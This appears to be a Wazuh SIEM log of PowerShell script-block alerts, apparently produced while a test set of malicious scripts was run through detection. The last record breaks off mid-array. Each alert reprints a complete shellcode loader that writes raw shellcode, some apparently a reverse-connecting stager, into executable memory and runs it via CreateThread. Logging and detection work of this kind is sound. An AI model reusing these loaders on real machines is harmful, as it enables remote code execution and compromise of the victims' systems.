{"timestamp":"2026-07-06T02:20:56.400+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":166,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304456.3637323","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:16.3651809Z","eventRecordID":"145560","processID":"8216","threadID":"7952","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x56,0x19,0x69,0xe3,0x68,0x02,0x00,0x71,0xbf,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 181527f0-4ba8-4765-88a7-d2963a01b0a2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3229.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x56,0x19,0x69,0xe3,0x68,0x02,0x00,0x71,0xbf,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"181527f0-4ba8-4765-88a7-d2963a01b0a2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3229.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:57.457+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":167,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304457.3648328","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:17.2235434Z","eventRecordID":"145564","processID":"8952","threadID":"8660","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Xn9 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Xn9 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xf8,0xdf,0x16,0x01,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xf7,0x3d,0xe3,0xfd,0xef,0x40,0x0c,0xfe,0xef,0x24,0x84,0x1b,0xde,0x64,0xf2,0x68,0x70,0x55,0x70,0x3c,0x7c,0x1e,0xd4,0xd5,0xf7,0x52,0xf1,0xda,0xb0,0xd9,0x27,0xd4,0x41,0x71,0x1b,0x77,0xc1,0x88,0x48,0x57,0xf8,0x42,0x9d,0x96,0x3d,0xbe,0x6c,0xca,0x96,0xb4,0xc3,0xfb,0x93,0x81,0xdf,0x70,0xef,0x04,0x58,0x64,0xa7,0x27,0x49,0x3b,0xbc,0x71,0x49,0xbd,0x11,0x0a,0xc0,0xa5,0x76,0x37,0x9a,0x5e,0x4c,0xc3,0x1d,0xb7,0x9d,0x2c,0xb1,0xf6,0x12,0xdf,0xcb,0x3f,0x94,0x00,0xbe,0x49,0xe7,0xbd,0xb9,0x8d,0x9a,0x19,0x4f,0x16,0x3c,0xe9,0xf7,0xf2,0xbd,0x3e,0x61,0x70,0xb1,0x8b,0xe5,0xde,0xd5,0x0a,0x29,0x55,0xe1,0x87,0xcc,0xba,0x60,0xd3,0xea,0x1e,0x29,0x87,0x93,0x07,0x97,0x66,0xab,0x58,0x78,0xd6,0x09,0x12,0x94,0x03,0x20,0x79,0xf0,0xe0,0x09,0x82,0x00,0x6f,0x19,0xf1,0x32,0x30,0xb1,0x9d,0x7e,0xb9,0x1f,0x59,0x81,0x90,0xd8,0xf5,0x7c,0x1b,0x19,0xdf,0xba,0x4f,0x49,0x77,0x6b,0xf0,0x02,0x87,0x94,0x25,0xbe,0x82,0x02,0x06,0x97,0x94,0x94,0xee,0xea,0xa6,0x09,0xb3,0x63,0x40,0x79,0x1b,0x24,0xdd,0x39,0xcb,0x84,0x8d,0xd1,0x01,0x0b,0xf1,0xc1,0x29,0xc1,0x9a,0x6b,0xc6,0xbc,0xf3,0x03,0x7f,0xe5,0x88,0xb2,0x80,0x33,0xf5,0xf4,0x0b,0xb0,0x09,0xba,0xfb,0xbd,0x19,0x2a,0x0c,0x88,0x40,0xfc,0x13,0x26,0xee,0x00,0x86,0xcd,0xb9,0x57,0x3e,0xcc,0x9c,0x9f,0xe1,0x2f,0xcb,0x94,0x28,0xba,0xb4,0xc2,0x54,0x2a,0x35,0x12,0x03,0x20,0x35,0x7a,0xf3,0x10,0x66,0x9f,0xfc,0x8c,0x1a,0x0c,0x69,0x2f,0x4b,0xe1,0x3a,0x47,0x71,0xdc,0x0d,0xc8,0x8a,0x0b,0x8c,0x34,0x5d,0x75,0xfa,0x54,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$d8Z=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($d8Z.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$d8Z,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 29b05be3-8b9f-427c-8e57-0966d38c6b85\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3231.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Xn9 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Xn9 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xf8,0xdf,0x16,0x01,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xf7,0x3d,0xe3,0xfd,0xef,0x40,0x0c,0xfe,0xef,0x24,0x84,0x1b,0xde,0x64,0xf2,0x68,0x70,0x55,0x70,0x3c,0x7c,0x1e,0xd4,0xd5,0xf7,0x52,0xf1,0xda,0xb0,0xd9,0x27,0xd4,0x41,0x71,0x1b,0x77,0xc1,0x88,0x48,0x57,0xf8,0x42,0x9d,0x96,0x3d,0xbe,0x6c,0xca,0x96,0xb4,0xc3,0xfb,0x93,0x81,0xdf,0x70,0xef,0x04,0x58,0x64,0xa7,0x27,0x49,0x3b,0xbc,0x71,0x49,0xbd,0x11,0x0a,0xc0,0xa5,0x76,0x37,0x9a,0x5e,0x4c,0xc3,0x1d,0xb7,0x9d,0x2c,0xb1,0xf6,0x12,0xdf,0xcb,0x3f,0x94,0x00,0xbe,0x49,0xe7,0xbd,0xb9,0x8d,0x9a,0x19,0x4f,0x16,0x3c,0xe9,0xf7,0xf2,0xbd,0x3e,0x61,0x70,0xb1,0x8b,0xe5,0xde,0xd5,0x0a,0x29,0x55,0xe1,0x87,0xcc,0xba,0x60,0xd3,0xea,0x1e,0x29,0x87,0x93,0x07,0x97,0x66,0xab,0x58,0x78,0xd6,0x09,0x12,0x94,0x03,0x20,0x79,0xf0,0xe0,0x09,0x82,0x00,0x6f,0x19,0xf1,0x32,0x30,0xb1,0x9d,0x7e,0xb9,0x1f,0x59,0x81,0x90,0xd8,0xf5,0x7c,0x1b,0x19,0xdf,0xba,0x4f,0x49,0x77,0x6b,0xf0,0x02,0x87,0x94,0x25,0xbe,0x82,0x02,0x06,0x97,0x94,0x94,0xee,0xea,0xa6,0x09,0xb3,0x63,0x40,0x79,0x1b,0x24,0xdd,0x39,0xcb,0x84,0x8d,0xd1,0x01,0x0b,0xf1,0xc1,0x29,0xc1,0x9a,0x6b,0xc6,0xbc,0xf3,0x03,0x7f,0xe5,0x88,0xb2,0x80,0x33,0xf5,0xf4,0x0b,0xb0,0x09,0xba,0xfb,0xbd,0x19,0x2a,0x0c,0x88,0x40,0xfc,0x13,0x26,0xee,0x00,0x86,0xcd,0xb9,0x57,0x3e,0xcc,0x9c,0x9f,0xe1,0x2f,0xcb,0x94,0x28,0xba,0xb4,0xc2,0x54,0x2a,0x35,0x12,0x03,0x20,0x35,0x7a,0xf3,0x10,0x66,0x9f,0xfc,0x8c,0x1a,0x0c,0x69,0x2f,0x4b,0xe1,0x3a,0x47,0x71,0xdc,0x0d,0xc8,0x8a,0x0b,0x8c,0x34,0x5d,0x75,0xfa,0x54,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$d8Z=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($d8Z.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$d8Z,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"29b05be3-8b9f-427c-8e57-0966d38c6b85","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3231.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:58.485+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":168,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304458.3659677","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:18.1903415Z","eventRecordID":"145568","processID":"8500","threadID":"4112","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$S4SR = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $S4SR -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x98,0x4b,0x35,0x00,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x97,0xa9,0xc0,0xfc,0x4f,0xaf,0x2b,0xfd,0x8f,0xd0,0xa2,0x18,0xbe,0xd0,0xd1,0x69,0x90,0xe0,0x92,0x3c,0x1c,0x8a,0xf7,0xd4,0x97,0xfe,0xdf,0xdb,0x10,0xb4,0x39,0xd5,0xa1,0xe5,0x7a,0x74,0x21,0xf4,0xae,0x56,0x18,0x37,0xa3,0x97,0x5d,0x2a,0x4e,0xc5,0x36,0x20,0xfd,0xfa,0x33,0x7c,0x3e,0x70,0x0f,0x90,0x46,0x65,0xc7,0x93,0x67,0x38,0x5c,0xca,0xa7,0xba,0xb1,0x66,0xee,0xa4,0xd6,0x43,0xb8,0x5f,0x2c,0x3f,0x3b,0xb6,0x7d,0xc0,0x90,0xf7,0xb2,0x33,0xe8,0x30,0x74,0xac,0x9f,0x48,0x87,0x51,0x98,0x8e,0xfa,0x8d,0x2d,0x15,0x5c,0x45,0x95,0xf1,0x5d,0x8a,0x40,0x71,0x51,0x67,0x06,0xdd,0x75,0x76,0xcb,0x55,0x81,0xf3,0xea,0xb9,0x00,0x47,0xc9,0x1d,0x49,0x13,0x70,0x07,0x37,0xf2,0x8d,0x57,0x98,0xab,0x2b,0x13,0x34,0xbf,0x41,0x7e,0x50,0x0c,0x68,0x81,0xa0,0x1a,0xfb,0xf2,0x92,0x85,0x57,0x9d,0x9e,0x4e,0x7e,0x5a,0xe1,0x64,0xc6,0xf4,0x1c,0x87,0x37,0xdc,0xda,0xd3,0x67,0x76,0xcb,0x5b,0xec,0x86,0xf4,0x89,0x99,0x83,0x62,0xbf,0xa1,0x14,0xcf,0xd7,0x5f,0x25,0x3e,0x74,0xe9,0xc3,0x10,0xd4,0xb9,0x5b,0xd0,0x84,0x79,0x0c,0xb8,0xce,0x75,0x73,0xd8,0xf0,0x5f,0x1c,0x72,0x1f,0x36,0x74,0xea,0x86,0x13,0x0e,0x8b,0x47,0x8e,0x6a,0x8b,0xcc,0x3d,0x8a,0x45,0x25,0x4b,0x98,0x31,0xc5,0x06,0xc2,0x97,0xda,0xbc,0x69,0x17,0x4f,0x3b,0x38,0x40,0xe7,0x41,0x1d,0xa6,0xa8,0xba,0x48,0xbd,0x61,0x2f,0x33,0xa9,0x8d,0xbf,0xb3,0x29,0xd8,0xd5,0xb3,0x41,0xbc,0x8d,0xe7,0x74,0xc3,0x1b,0x94,0x25,0x56,0xa4,0xcd,0x9a,0xf1,0xcc,0xf3,0xc5,0x36,0x53,0x0b,0x20,0xc7,0xaf,0xda,0x0c,0xbd,0xc1,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Yoi=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Yoi.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Yoi,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 61519315-1f8d-40e8-ad4e-3fc8482b9366\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3241.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$S4SR = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $S4SR -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x98,0x4b,0x35,0x00,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x97,0xa9,0xc0,0xfc,0x4f,0xaf,0x2b,0xfd,0x8f,0xd0,0xa2,0x18,0xbe,0xd0,0xd1,0x69,0x90,0xe0,0x92,0x3c,0x1c,0x8a,0xf7,0xd4,0x97,0xfe,0xdf,0xdb,0x10,0xb4,0x39,0xd5,0xa1,0xe5,0x7a,0x74,0x21,0xf4,0xae,0x56,0x18,0x37,0xa3,0x97,0x5d,0x2a,0x4e,0xc5,0x36,0x20,0xfd,0xfa,0x33,0x7c,0x3e,0x70,0x0f,0x90,0x46,0x65,0xc7,0x93,0x67,0x38,0x5c,0xca,0xa7,0xba,0xb1,0x66,0xee,0xa4,0xd6,0x43,0xb8,0x5f,0x2c,0x3f,0x3b,0xb6,0x7d,0xc0,0x90,0xf7,0xb2,0x33,0xe8,0x30,0x74,0xac,0x9f,0x48,0x87,0x51,0x98,0x8e,0xfa,0x8d,0x2d,0x15,0x5c,0x45,0x95,0xf1,0x5d,0x8a,0x40,0x71,0x51,0x67,0x06,0xdd,0x75,0x76,0xcb,0x55,0x81,0xf3,0xea,0xb9,0x00,0x47,0xc9,0x1d,0x49,0x13,0x70,0x07,0x37,0xf2,0x8d,0x57,0x98,0xab,0x2b,0x13,0x34,0xbf,0x41,0x7e,0x50,0x0c,0x68,0x81,0xa0,0x1a,0xfb,0xf2,0x92,0x85,0x57,0x9d,0x9e,0x4e,0x7e,0x5a,0xe1,0x64,0xc6,0xf4,0x1c,0x87,0x37,0xdc,0xda,0xd3,0x67,0x76,0xcb,0x5b,0xec,0x86,0xf4,0x89,0x99,0x83,0x62,0xbf,0xa1,0x14,0xcf,0xd7,0x5f,0x25,0x3e,0x74,0xe9,0xc3,0x10,0xd4,0xb9,0x5b,0xd0,0x84,0x79,0x0c,0xb8,0xce,0x75,0x73,0xd8,0xf0,0x5f,0x1c,0x72,0x1f,0x36,0x74,0xea,0x86,0x13,0x0e,0x8b,0x47,0x8e,0x6a,0x8b,0xcc,0x3d,0x8a,0x45,0x25,0x4b,0x98,0x31,0xc5,0x06,0xc2,0x97,0xda,0xbc,0x69,0x17,0x4f,0x3b,0x38,0x40,0xe7,0x41,0x1d,0xa6,0xa8,0xba,0x48,0xbd,0x61,0x2f,0x33,0xa9,0x8d,0xbf,0xb3,0x29,0xd8,0xd5,0xb3,0x41,0xbc,0x8d,0xe7,0x74,0xc3,0x1b,0x94,0x25,0x56,0xa4,0xcd,0x9a,0xf1,0xcc,0xf3,0xc5,0x36,0x53,0x0b,0x20,0xc7,0xaf,0xda,0x0c,0xbd,0xc1,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Yoi=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Yoi.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Yoi,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"61519315-1f8d-40e8-ad4e-3fc8482b9366","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3241.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:58.546+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":169,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304458.3671034","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:19.0096443Z","eventRecordID":"145572","processID":"2636","threadID":"288","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x05,0xdb,0xca,0xa6,0x68,0x02,0x00,0x11,0x5d,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff